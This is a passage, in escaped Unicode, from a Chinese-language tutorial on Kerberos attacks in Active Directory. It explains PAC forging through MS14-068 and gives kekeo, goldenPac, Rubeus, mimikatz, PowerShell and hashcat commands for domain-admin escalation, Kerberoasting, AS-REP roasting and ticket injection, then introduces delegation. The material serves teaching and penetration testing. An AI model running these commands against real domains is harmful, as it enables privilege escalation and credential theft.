\u51ed\u8bc1\u4fe1\u606f\u3002PAC\u7ed3\u6784\u4e0d\u5e94\u5305\u542b\u591a\u4e2a\u6b64\u7c7b\u7f13\u51b2\u533a\u3002\u7b2c\u4e8c\u6216\u540e\u7eed\u51ed\u8bc1\u4fe1\u606f\u7f13\u51b2\u533a\u5728\u63a5\u6536\u65f6\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x00000006 \u670d\u52a1\u5668\u6821\u9a8c\u548c\u3002PAC\u7ed3\u6784\u5fc5\u987b\u5305\u542b\u4e00\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u5176\u4ed6\u767b\u5f55\u670d\u52a1\u5668\u6821\u9a8c\u548c\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x00000007 KDC\uff08\u7279\u6743\u670d\u52a1\u5668\uff09\u6821\u9a8c\u548c\uff08\u7b2c2.8\u8282\uff09\u3002PAC\u7ed3\u6784\u5fc5\u987b\u5305\u542b\u4e00\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u9644\u52a0\u7684KDC\u6821\u9a8c\u548c\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x0000000A \u5ba2\u6237\u540d\u79f0\u548c\u7968\u8bc1\u4fe1\u606f\u3002PAC\u7ed3\u6784\u5fc5\u987b\u5305\u542b\u4e00\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u9644\u52a0\u7684\u5ba2\u6237\u548c\u7968\u636e\u4fe1\u606f\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x0000000B \u53d7\u7ea6\u675f\u7684\u59d4\u6d3e\u4fe1\u606f\u3002PAC\u7ed3\u6784\u5fc5\u987b\u5305\u542b\u4e00\u4e2aS4U2proxy\u8bf7\u6c42\u7684\u6b64\u7c7b\u7f13\u51b2\u533a\uff0c\u5426\u5219\u4e0d\u5305\u542b\u3002\u9644\u52a0\u7684\u53d7\u7ea6\u675f\u7684\u59d4\u6258\u4fe1\u606f\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x0000000C \u7528\u6237\u4e3b\u4f53\u540d\u79f0\uff08UPN\uff09\u548c\u57df\u540d\u7cfb\u7edf\uff08DNS\uff09\u4fe1\u606f\u3002PAC\u7ed3\u6784\u4e0d\u5e94\u5305\u542b\u591a\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u63a5\u6536\u65f6\u5fc5\u987b\u5ffd\u7565\u7b2c\u4e8c\u4e2a\u6216\u540e\u7eed\u7684UPN\u548cDNS\u4fe1\u606f\u7f13\u51b2\u533a\u3002 0x0000000D \u5ba2\u6237\u7d22\u53d6\u4fe1\u606f\u3002PAC\u7ed3\u6784\u4e0d\u5e94\u5305\u542b\u591a\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u9644\u52a0\u7684\u5ba2\u6237\u8981\u6c42\u4fe1\u606f\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x0000000E \u8bbe\u5907\u4fe1\u606f\u3002PAC\u7ed3\u6784\u4e0d\u5e94\u5305\u542b\u591a\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u9644\u52a0\u7684\u8bbe\u5907\u4fe1\u606f\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x0000000F \u8bbe\u5907\u58f0\u660e\u4fe1\u606f\u3002PAC\u7ed3\u6784\u4e0d\u5e94\u5305\u542b\u591a\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u9644\u52a0\u7684\u8bbe\u5907\u58f0\u660e\u4fe1\u606f\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 \u5176\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u662f1,6\u548c7 0x00000001 KERBVALIDATIONINFO \u8fd9\u4e2a\u7ed3\u6784\u7528\u4e8e\u5b58\u50a8\u7528\u6237\u7684\u8eab\u4efd\u4fe1\u606f.\u5b83\u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u8fd9\u4e2a\u7ed3\u6784\u4f53\u662f\u8fd9\u6837\u7684(\u5f85\u4f1a\u6211\u4eec\u4f2a\u9020PAC\u7684\u65f6\u5019\u4e3b\u8981\u5c31\u662f\u4f2a\u9020\u6b64\u5904\u989d UserId \u4ee5\u53ca PGROUP_MEMBERSHIP GroupIds \uff09\u670d\u52a1\u5668\u89e3\u5305PAC\u540e\u63d0\u53d6\u7528\u6237\u7684sid\u4ee5\u53cagroupid\uff0c\u7136\u540e\u5c31\u628a\u5f53\u524d\u53d1\u5305\u8fc7\u6765\u7684\u7528\u6237\u6743\u9650\u5f53\u6210sid\uff0cgroupid\u7684\u6743\u9650\u5904\u7406\u3002 typedef struct _KERB_VALIDATION_INFO { FILETIME LogonTime; FILETIME LogoffTime; FILETIME KickOffTime; FILETIME PasswordLastSet; FILETIME PasswordCanChange; FILETIME PasswordMustChange; RPC_UNICODE_STRING EffectiveName; RPC_UNICODE_STRING FullName; RPC_UNICODE_STRING LogonScript; RPC_UNICODE_STRING ProfilePath; RPC_UNICODE_STRING HomeDirectory; RPC_UNICODE_STRING HomeDirectoryDrive; USHORT LogonCount; USHORT BadPasswordCount; ULONG UserId; //\u7528\u6237\u7684sid ULONG PrimaryGroupId; ULONG GroupCount; [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;//\u7528\u6237\u6240\u5728\u7684\u7ec4\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u7be1\u6539\u7684\u8fd9\u4e2a\u7684\u8bdd\uff0c\u6dfb\u52a0\u4e00\u4e2a500(\u57df\u7ba1\u7ec4)\uff0c\u90a3\u7528\u6237\u5c31\u662f\u57df\u7ba1\u4e86\u3002\u5728ms14068 PAC\u7b7e\u540d\u88ab\u7ed5\u8fc7\uff0c\u7528\u6237\u53ef\u4ee5\u81ea\u5df1\u5236\u4f5cPAC\u7684\u60c5\u51b5\u5e95\u4e0b\uff0cpykek\u5c31\u662f\u9760\u5411\u8fd9\u4e2a\u5730\u65b9\u5199\u8fdb\u57df\u7ba1\u7ec4\uff0c\u6210\u4e3a\u4f7f\u5f97\u6539\u7528\u6237\u53d8\u6210\u57df\u7ba1 ULONG UserFlags; USER_SESSION_KEY UserSessionKey; RPC_UNICODE_STRING LogonServer; RPC_UNICODE_STRING LogonDomainName; PISID LogonDomainId; ULONG Reserved1[2]; ULONG UserAccountControl; ULONG SubAuthStatus; FILETIME LastSuccessfulILogon; FILETIME LastFailedILogon; ULONG FailedILogonCount; ULONG Reserved3; ULONG SidCount; [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids; PISID ResourceGroupDomainSid; ULONG ResourceGroupCount; [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds; } KERB_VALIDATION_INFO; 0x00000006\u548c0x00000007 6\u662f\u670d\u52a1\u5668\u6821\u9a8c\u548c\uff0c\u7531server\u5bc6\u7801\u52a0\u5bc6\u30027\u662fKDC\u6821\u9a8c\u548c\uff0c\u53c8KDC\u5bc6\u7801\u52a0\u5bc6\u3002\u5b58\u5728\u7684\u76ee\u7684\u5c31\u662f\u9632\u6b62PAC\u88ab\u7be1\u6539\u3002 MS14068 \u8fd9\u4e2a\u6f0f\u6d1e\u7684\u4ea7\u751f\u4e3b\u8981\u662f\u5fae\u8f6f\u72af\u4e0b\u4e86\u4e09\u4e2a\u9519\u8bef\uff1a 1.\u5bf9\u6821\u9a8c\u548c\u7684\u7b97\u6cd5\u5b9e\u73b0\u4e0d\u591f\u7ec6\u81f4\uff0c\u5bfc\u81f4\u5728\u6821\u9a8c\u548c\u751f\u6210\u65f6\u53ef\u4ee5\u4e0d\u7528\u7ba1server\u548cKDC\u7684hash\u76f4\u63a5\u751f\u6210\uff0c\u800c\u4e14\u751f\u6210\u51fa\u6765\u7684\u6821\u9a8c\u548c\u8fd8\u662f\u5408\u6cd5\u7684 2.PAC\u53ef\u4ee5\u4e0d\u7528\u653e\u5728TGT\u4e2d\uff0c\u5373\u4f7f\u662f\u8fd9\u6837\uff0cKDC\u4e5f\u80fd\u7167\u5e38\u89e3\u6790\u51faTGT\u5916\u7684PAC 3.\u4e0b\u9762\u518d\u8bf4 \u90a3\u4e48\u8fd9\u4e2a\u6f0f\u6d1e\u5927\u81f4\u7684\u653b\u51fb\u539f\u7406\u662f\u4ec0\u4e48\u5462\u3002 \u9996\u5148\uff0c\u6211\u4eec\u5728as_request\u7684\u65f6\u5019\uff0c\u628ainclude-PAC\u6807\u5fd7\u8bbe\u7f6e\u4e3afalse\uff0c\u90a3\u4e48as_rep\u5c31\u4e0d\u4f1a\u5728TGT\u4e2d\u8fd4\u56dePAC\u4e86\u3002\u7136\u540e\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u81ea\u5df1\u4f2a\u9020\u4e00\u4e2apac\uff0c\u5728TGS_REQ\u65f6\u53d1\u8fc7\u53bb\u5c31\u884c\u4e86\u3002\u4f2a\u9020\u7684pac\u4fee\u6539USER SID\\&GROUP SID(\u5728PAC\u7684 0x00000001 KERBVALIDATIONINFO \u7ed3\u6784)\u53ef\u4ee5\u628a\u6211\u4eec\u7684\u7528\u6237\u6743\u9650\u6539\u5230\u5f88\u9ad8\uff08\u57df\u7ba1\uff09\uff0c\u4ece\u800c\u8fbe\u5230\u63d0\u6743\u5230\u57df\u7ba1\u7684\u80fd\u529b\u3002 \u90a3\u4e48\u4f2a\u9020PAC\uff0c\u6211\u4eec\u5c31\u9047\u5230\u4e86\u4e24\u4e2a\u95ee\u9898\uff1a 1.pac\u91cc\u6709\u6821\u9a8c\u548c\uff0c\u9632\u6b62\u81ea\u5df1\u88ab\u7be1\u6539\uff0c\u6211\u4eec\u5f97\u6709server\u548cKDC\u5bc6\u7801\u624d\u80fd\u4f7f\u6821\u9a8c\u548c\u5408\u6cd5\u3002 2.pac\u6309\u7406\u8bf4\u5e94\u8be5\u5728TGT\u91cc\uff0c\u4f46\u662fTGT\u662f\u88abkbrtgt hash\u52a0\u5bc6\u7684\uff0c\u6211\u4eec\u65e0\u6cd5\u83b7\u53d6kbrtgt hash\u7ee7\u800c\u65e0\u6cd5\u4fee\u6539TGT\u5185\u5bb9\uff0c\u7ee7\u800c\u4e0d\u80fd\u4fee\u6539PAC\u3002 \u6765\u8bf4\u8bf4\u5982\u4f55\u7ed5\u8fc7PAC\u6821\u9a8c\u548c\u95ee\u9898\u3002 \u6211\u4eec\u521a\u521a\u8bf4\u8fc7\uff0c 0x00000006\u548c0x00000007 \u8fd9\u4e24\u4e2a\u7ed3\u6784\u7684\u5b58\u5728\u662f\u4e3a\u4e86\u9632\u6b62PAC\u88ab\u7be1\u6539\uff0c\u8fd9\u4e2a\u6821\u9a8c\u548c\u7b97\u6cd5\u91c7\u7528\u7684\u662f\u4e2a\u53ebchecksum\u7b97\u6cd5\u7136\u540e\u628akdc hash\u548c\u670d\u52a1hash\u5f53\u4f5ckey\u5bf9PAC\u52a0\u5bc6\u4ea7\u751f\u7684\u503c\uff0c\u4ece\u800c\u9632\u6b62PAC\u88ab\u7be1\u6539\u3002\u4f46\u662fchecksum\u7b97\u6cd5\u662f\u6709\u5f88\u591a\u79cd\u7684\uff0cmd5\u4e5f\u662fchecksum\u7684\u5206\u652f\u4e4b\u4e00\uff0c\u4fee\u6539PAC\u540e\uff0c\u6211\u4eec\u53ea\u9700\u8bbe\u7f6e\u52a0\u5bc6\u7b97\u6cd5\u4e3aMD5\u5e76\u7528MD5\u7b97\u6cd5\u5bf9 0x00000001 KERBVALIDATIONINFO \u8fdb\u884c\u52a0\u5bc6\uff0c\u5c06\u751f\u6210\u7684\u503c\u653e\u5165\u4e24\u4e2a\u68c0\u9a8c\u548c\u5373\u53ef\uff0cKDC\u62ff\u5230 0x00000001 KERBVALIDATIONINFO \uff0c\u5e76\u4e14\u901a\u8fc7\u89e3\u6790\u6570\u636e\u5305\u83b7\u53d6\u5f53\u524d\u52a0\u5bc6\u7b97\u6cd5\u4e3aMD5\uff0c\u7136\u540e\u5bf9\u5176\u8fdb\u884cMD5\u52a0\u5bc6\uff0c\u82e5\u52a0\u5bc6\u7ed3\u679c\u4e0e\u6821\u9a8c\u548c\u4e00\u81f4\uff0c\u5219\u8ba4\u4e3aPAC\u672a\u88ab\u4fee\u6539 \u518d\u6765\u8bf4\u8bf4\u5982\u4f55\u7ed5\u8fc7krbtgt hash\u52a0\u5bc6TGT\u7684\u95ee\u9898\u3002 \u56e0\u4e3a\u6211\u4eec\u5728AS_REQ\u65f6\u8bbe\u7f6einclude-PAC\u4e3afalse\uff0cTGT\u91cc\u5c31\u4e0d\u4f1a\u5305\u542bPAC\u4e86\u3002\u90a3\u4e48\u6211\u4eec\u5728TGS_REQ\u65f6\u5982\u4f55\u628aPAC\u4f20\u9012\u7ed9KDC\uff1f\u53ea\u9700\u8981\u628aPAC\u653e\u5165req-body\u5373\u53ef\u3002 \u8fd9\u6837KDC\u4f9d\u65e7\u4f1a\u6b63\u5e38\u89e3\u6790\u8fd9\u4e2aTGS_REQ\u5305 \u6ce8\u610fTGS_REQ\u91cc\u7684include-pac\u4f9d\u65e7\u662ffalse\u3002 \u7136\u540eKDC\u63a5\u6536\u5230PAC\u540e\u4f1a\u5148\u89e3\u5bc6TGT\u62ff\u5230authenticator\u91cc\u7684key\u5bf9PAC\u8fdb\u884c\u89e3\u5bc6\uff08TGS_REQ\u65f6\u52a0\u5bc6PAC\u7528\u7684key\u662f\u968f\u673a\u751f\u6210\u7684\uff0c\u8fd9\u4e2akey\u4f1a\u653e\u5728authenticator\u91cc\uff09\uff0c\u7136\u540e\u9a8c\u8bc1\u4e00\u4e0bPAC\u7684\u7b7e\u540d\uff0c\u82e5\u6210\u529f\u7136\u540e\u628a\u89e3\u5bc6\u5f97\u5230\u7684PAC\u91c7\u7528server key\u548cKDC key\u91cd\u65b0\u751f\u6210\u6821\u9a8c\u548c\uff0c\u62fc\u63a5\u6210\u4e00\u4e2a\u65b0\u7684TGT\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002 \u4e0a\u9762\u8fd9\u4e00\u6bb5\u5c31\u662f\u5fae\u8f6f\u72af\u4e0b\u7684\u7b2c\u4e09\u4e2a\u9519\u8bef\uff0c\u5f88\u4e0d\u53ef\u601d\u8bae\uff0c\u5c45\u7136\u83ab\u540d\u5176\u5999\u7684\u8fd4\u56de\u4e86\u4e00\u4e2a\u5305\u542b\u4e86PAC\u7684TGT\u56de\u6765\u3002\u603b\u7ed3\u6765\u8bf4\u5c31\u662f\u6784\u9020\u4e86\u4e00\u4e2a\u7578\u5f62\u7684TGS_REQ\uff0c\u4eceTGS_RES\u5f97\u5230\u4e86\u4e00\u4e2a\u5305\u542b\u4f2a\u9020PAC\u7684TGT\u3002 \u539f\u7406\u5c31\u662f\u4e0a\u9762\u8fd9\u4e9b\uff0c\u7136\u540e\u6211\u4eec\u7528\u5305\u542b\u4f2a\u9020PAC\u7684TGT\u5230\u5904\u8bbf\u95ee\u670d\u52a1\u5373\u53ef\u3002 M14068\u5229\u7528 1.\u5de5\u5177kekeo https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718 \u5177\u4f53\u65b9\u6cd5\u4e3a\uff0c\u5728kekeo\u91cc\u5148\u6267\u884c kerberos::purge\u6e05\u7a7a\u7968\u636e \u7136\u540e\u518d\u6267\u884c exploit::ms14068 /user:xxx /password:xxx /domain:xxx /ptt \u5373\u53ef\u3002 \u7136\u540e\u5c31dir \\\u57df\u63a7\\c\\$ \u8bd5\u8bd5\uff0c\u5982\u679c\u53ef\u4ee5\u5c31\u8bf4\u660e\u63d0\u6743\u6210\u529f\u4e86\uff08\u4e0d\u662f\u6bcf\u6b21\u90fd\u80fd\u6210\u529f\u7684) 2.golenpac https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe \u8fd9\u4e2a\u5de5\u5177\u597d\u7528, \u6267\u884c\u7c7b\u4f3c\u4e0a\u8ff0\u547d\u4ee4\uff0c\u5c31\u80fd\u8fd4\u56de\u4e00\u4e2a\u57df\u63a7\u7684 system\u6743\u9650\u7684cmd shell\u56de\u6765\uff0c\u611f\u89c9\u86ee\u597d\u7528 \u53e6\u5916\u5728\u6700\u540e\u6307\u5b9a\u57df\u63a7\u673a\u5668\u65f6\uff0c\u53ef\u4ee5\u6307\u5b9a\u57df\u63a7\u4ee5\u5916\u7684\u673a\u5668\u5e76\u83b7\u53d6\u4ed6\u4eec\u7684\u672c\u5730system\u6743\u9650\u7528\u6237. \u4f46\u8fd4\u56de\u7684\u4f3c\u4e4e\u4e0d\u662f\u57df\u63a7\uff1f kerberoast Kerberoast\u653b\u51fb\u539f\u7406: \u653b\u51fb\u8005\u4ece TGS-REP \u4e2d\u63d0\u53d6\u52a0\u5bc6\u7684\u670d\u52a1\u7968\u8bc1\u3002 \u7531\u4e8e\u670d\u52a1\u7968\u8bc1\u662f\u7528\u94fe\u63a5\u5230\u8bf7\u6c42 SPN \u7684\u5e10\u6237\u7684\u54c8\u5e0c\u52a0\u5bc6\u7684\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u53ef\u4ee5\u79bb\u7ebf\u7834\u89e3\u8fd9\u4e2a\u52a0\u5bc6\u5757\uff0c\u6062\u590d\u5e10\u6237\u7684\u660e\u6587\u5bc6\u7801 How to get SPN \u5982\u4f55\u5f97\u5230\u57df\u4e2d\u7684\u6240\u6709SPN\uff1f 1.setspn \u5f88\u7b80\u5355\uff0c\u53ea\u9700\u6267\u884c setspn -q */* \u5373\u53ef 2.kerberoast\u5de5\u5177\u96c6\u7684GetUserSpns powershell\u811a\u672c How to get HASH \u5982\u4f55\u5f97\u5230hash\uff1f \u6709\u5982\u4e0b\u65b9\u6cd5 1.Rubeus.exe \u8fd9\u4e2a\u5de5\u5177github\u4e0a\u5c31\u6709\uff0c\u4f46\u662fclone\u4e0b\u6765\u540e\u9700\u8981\u81ea\u5df1\u7f16\u8bd1\u6210exe. \u7136\u540e\u6267\u884c Rubeus.exe kerberoast\u6307\u4ee4\u5373\u53ef 2.mimikatz mimikatz\u771f\u7684\u795e\u5668\u3002 \u901a\u8fc7\u547d\u4ee4 kerberos::ask /target:\u4f60\u6240\u6307\u5b9a\u7684SPN, \u5373\u53ef\u901a\u8fc7\u8ba4\u8bc1\u7684\u65b9\u5f0f\u5f97\u5230\u4e00\u4e2aST\u3002 \u7136\u540e\u6211\u4eec\u5728kerberos::list\u91cc\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u60f3\u8981\u7684ST 3.powershell \u8d8a\u6765\u8d8a\u53d1\u73b0powershell\u5728\u57df\u6e17\u900f\u4e2d\u7684\u91cd\u8981\u6027\u4e86 \u8f93\u5165\u4ee5\u4e0b\u6307\u4ee4\uff0c\u5373\u53ef\u5b8c\u6210HASH\u83b7\u53d6 Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MySQL/win7.xie.com:3306/MySQL\" \u7136\u540emimikatz\u5bfc\u51fa\u5373\u53ef How to export hash \u83b7\u5f97\u4e86ST\u7968\u636e\uff0c\u4f46\u600e\u4e48\u5bfc\u51fa\uff1f 1.mimikatz \u5bfc\u51fa\u6240\u6709\u7968\u636e \u53ef\u4ee5\u53d1\u73b0\u751f\u6210\u4e86kirbi\u6587\u4ef6\u3002\u8fd9\u5c31\u662f\u6211\u4eec\u6240\u9700\u8981\u7684hash\u4e86 2.Empire Powershell \u6846\u67b6 github: https://github.com/EmpireProject/Empire \u6211\u4eec\u901a\u8fc7\u8fd9\u4e2a\u6846\u67b6\u53ef\u4ee5\u5bfc\u51fahashcat\u683c\u5f0f\u7684hash. Import-Module .\\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat How to crack HASH \u5982\u4f55\u7834\u89e3HASH? 1.HASHCAT \u8fd9\u4e2a\u5de5\u5177\u9700\u8981\u8ba9hash\u683c\u5f0f\u4e3ahashcat\u6a21\u5f0f\u624d\u80fd\u8fdb\u884c\u7834\u89e3\u3002kribi\u6587\u4ef6\u4e0d\u80fd\u653e\u5165hashcat\u8fdb\u884c\u7834\u89e3. hashcat -m 13110 pass.txt hash.txt 2.kerberoast\u4e2d\u7684tgsrepcrack.py \u652f\u6301kribi\u6587\u4ef6\u7834\u89e3 python3 tgsrepcrack.py pass.txt xxx.kribi How to use Kerberoast \u65e2\u7136\u6211\u4eec\u90fd\u628aST\u7684\u52a0\u5bc6hash\u90fd\u7834\u89e3\u4e86\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u968f\u4fbf\u6539ST\u4e2d\u7684\u7968\u636e\u5185\u5bb9\u4e86..\\ \u8fd9\u91cc\u4f7f\u7528\u7684\u662fkerberoast\u5de5\u5177\u96c6\u91cc\u7684kerberoast.py python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500 python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512 ## \u5c06\u7968\u636e\u6743\u9650\u6539\u4e3aadministrator kerberos::ptt PENTESTLAB.kirbi #\u5c06\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58 AS_REP Roast \u8f83Kerberoast\u6765\u8bf4\uff0c\u6bd4\u8f83\u9e21\u808b\u3002 \u5b83\u7684\u539f\u7406\u662f\u5728\u4e0d\u5f00\u542fkerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\u7684\u524d\u63d0\u4e0b\uff0c\u83b7\u5f97\u5176\u4ed6\u7528\u6237\u7684AS_RES\uff0c\u5e76\u7834\u89e3\u52a0\u5bc6session key \u7684 client hash\u3002 How to get HASH 1.Rubeus Rubeus.exe asreproast \u7136\u540e\u5c31\u4f1a\u641c\u7d22\u57df\u4e2d\u4e0d\u9700\u8981kerberos\u9884\u9a8c\u8bc1\u7684\u7528\u6237\uff0c\u5e76\u83b7\u5f97ASREP\u3002 2.Empire\u6846\u67b6\u4e0e ASREPRoast.ps1 \u4f7f\u7528Empire\u6846\u67b6\u4e0b\u7684powerview.ps1\u67e5\u627e\u57df\u4e2d\u8bbe\u7f6e\u4e86 \u201c\u4e0d\u9700\u8981kerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\u201d \u7684\u7528\u6237 Import-Module .\\powerview.ps1 Get-DomainUser -PreauthNotRequired \u7136\u540e\u7528 ASREPRoast.ps1 \uff1a https://github.com/HarmJ0y/ASREPRoast \u83b7\u53d6\u6307\u5b9a\u7528\u6237\u7684AS-REPhash Import-Module ASREPRoast.ps1 Get-ASREPHash -USER xx -Domain xx |Out-file -Encoding ASCII hash.txt \u5c31\u4f1a\u751f\u6210\u4e00\u4e2ahash\u6570\u636e\u6587\u4ef6\u4e86 How to crack hash \u5c06\u751f\u6210\u7684HASH\u4fdd\u5b58\u8d77\u6765\uff0c\u5e76\u5728\u4e0b\u56fe\u5904\u52a0\u5165\\$23 \u7136\u540e\u4e22\u7ed9hashcat \u8dd1 hashcat -m 18200 hash.txt pass.txt \u6ce8\u610f\u8fd9\u91cc\u7684pass.txt\u662f\u81ea\u5df1\u7684\u660e\u6587\u5b57\u5178\u2026\u4e4b\u524d\u6211\u8fd8\u4e00\u76f4\u4ee5\u4e3a\u662f\u7206\u7834\u51fa\u6765\u7684\u7ed3\u679c. \u539f\u6765\u662f\u4e00\u4e2a\u4e00\u4e2a\u7684\u7528\u660e\u6587\u5b57\u5178\u53bb\u7206\u7834\u3002 \u59d4\u6d3e\u653b\u51fb \u57df\u59d4\u6d3e \u57df\u59d4\u6d3e\u662f\u4e00\u79cd\u57df\u5185\u4e3b\u673a\u7684\u884c\u4e3a\uff0c\u4f7f\u67d0\u4e2a\u670d\u52a1\u53ef\u4ee5\u4ee5\u8bbf\u95ee\u7684\u7528\u6237\u7684\u8eab\u4efd\u53bb\u8bbf\u95ee\u53e6\u5916\u4e00\u4e2a\u670d\u52a1\u3002 \u4e3a\u4ec0\u4e48\u9700\u8981\u57df\u59d4\u6d3e\u5462\uff0c\u6bd4\u5982\u73b0\u5728\u6709web\u670d\u52a1\u5668\u548c\u6587\u4ef6\u670d\u52a1\u5668\uff0c\u5f53\u7528\u6237A\u8bbf\u95eeweb\u670d\u52a1\u5668\u53bb\u8bf7\u6c42\u67d0\u4e2a\u8d44\u6e90\u65f6\uff0cweb\u670d\u52a1\u5668\u4e0a\u672c\u8eab\u5e76\u6ca1\u6709\u8be5\u8d44\u6e90\uff0c\u6240\u4ee5web\u670d\u52a1\u5668\u5c31\u4f1a\u4ece\u6587\u4ef6\u670d\u52a1\u5668\u4e0a\u8c03\u7528\u8fd9\u4e2a\u8d44\u6e90\uff0c\u5176\u4e2d\u53d1\u751f\u7684\u8fc7\u7a0b\u82e5\u4ee5\u57df\u59d4\u6d3e\u7684\u5f62\u5f0f\u8fdb\u884c\uff0c\u90a3\u4e48\u5c31\u662f\uff1a \u7528\u6237A\u8bbf\u95eeweb\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u518d\u4ee5\u7528\u6237A\u7684\u8eab\u4efd\u53bb\u8bbf\u95ee\u6587\u4ef6\u670d\u52a1\u5668\u3002 \u53d1\u751f\u57df\u59d4\u6d3e\u7684\u670d\u52a1\u4e00\u822c\u4e3a\u673a\u5668\u8d26\u6237\u548c\u670d\u52a1\u8d26\u6237\u3002 \u57df\u59d4\u6d3e\u5206\u4e3a\u4e09\u79cd\uff1a\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e \u975e\u7ea6\u675f\u6027\u59d4\u6d3e \u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u539f\u7406\u662f\uff1a\u7528\u6237\u60f3\u8bbf\u95ee\u670d\u52a1A\uff0c\u4e8e\u662f\u5411KDC\u63d0\u4ea4\u8ba4\u8bc1\uff0cKDC\u53d1\u73b0A\u662f\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u4e8e\u662f\u4f1a\u628aTGT\u653e\u5728ST\u4e2d\u4e00\u5e76\u7ed9\u7528\u6237\u3002\u7136\u540e\u7528\u6237\u7528\u8fd9\u4e2aST\u53bb\u8bbf\u95ee\u670d\u52a1A\uff0c\u670d\u52a1A\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86\u7528\u6237\u7684TGT\uff0c\u628aTGT\u653e\u5165lsass\u8fdb\u7a0b\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u62ff\u7740\u7528\u6237\u7684TGT\u4ee5\u7528\u6237\u7684\u8eab\u4efd\u53bb\u8bbf\u95ee\u6240\u6709\u7528\u6237\u6743\u9650\u80fd\u591f\u8bbf\u95ee\u7684\u670d\u52a1\u4e86\u3002 \u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u542f\u7528\uff1a \u4e3a\u67d0\u8d26\u6237\u542f\u7528 \u4fe1\u4efb\u6b64\u8ba1\u7b97\u673a\u6765\u59d4\u6d3e\u4efb\u4f55\u670d\u52a1 \u5373\u5f00\u542f\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u3002 \u5f00\u542f\u540e\u5728\u8be5\u7528\u6237\u7684 ACL\u5c5e\u6027\u4f1a\u591a\u51fa\u4e00\u4e2a flag : WORKSTATION_TRUSTED_FOR_DELEGATION (\u56fe\u622a\u4e0d\u5b8c\uff0c\u53cd\u6b63\u8fd9\u4e2aflag\u5c31\u5728\u7bad\u5934\u6240\u6307\u5904\u7684\u540e\u9762) \u975e\u7ea6\u675f\u59d4\u6d3e\u7684\u8bbe\u7f6e\u9700\u8981 SeEnableDelegation \u7279\u6743\uff0c\u8be5\u7279\u6743\u901a\u5e38\u4ec5\u6388\u4e88\u57df\u7ba1\u7406\u5458 \u8fd9\u91cc\u8bf4\u4e2a\u9898\u5916\u8bdd\uff0c\u57df\u63a7\u4e3b\u673a\u9ed8\u8ba4\u662f\u975e\u7ea6\u675f\u6027\u59d4\u6d3e \u7ea6\u675f\u6027\u59d4\u6d3e \u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u662f\u5f88\u4e0d\u5b89\u5168\u7684\uff08\u56e0\u4e3a\u63a7\u5236\u4e86\u5f00\u542f\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u673a\u5668\uff0c\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86\u4e0a\u9762\u7684\u6240\u6709\u5176\u4ed6\u7528\u6237\u7684TGT\uff09\uff0c\u6240\u4ee5\u66f4\u5b89\u5168\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u8bde\u751f\u4e86\u3002 \u7ea6\u675f\u6027\u59d4\u6d3e\u591a\u4e86\u4e24\u4e2a\u59d4\u6d3e\u534f\u8bae\uff0cS4U2SELF S4U2PROXY\uff0c\u5e76\u4e14\u9650\u5236\u4e86\u88ab\u8bbe\u7f6e\u59d4\u6d3e\u7684\u670d\u52a1\u7684\u8bbf\u95ee\u8303\u56f4\uff1a\u4ec5\u80fd\u88ab\u59d4\u6d3e\u5230\u88ab\u6307\u5b9a\u7684\u670d\u52a1\u3002 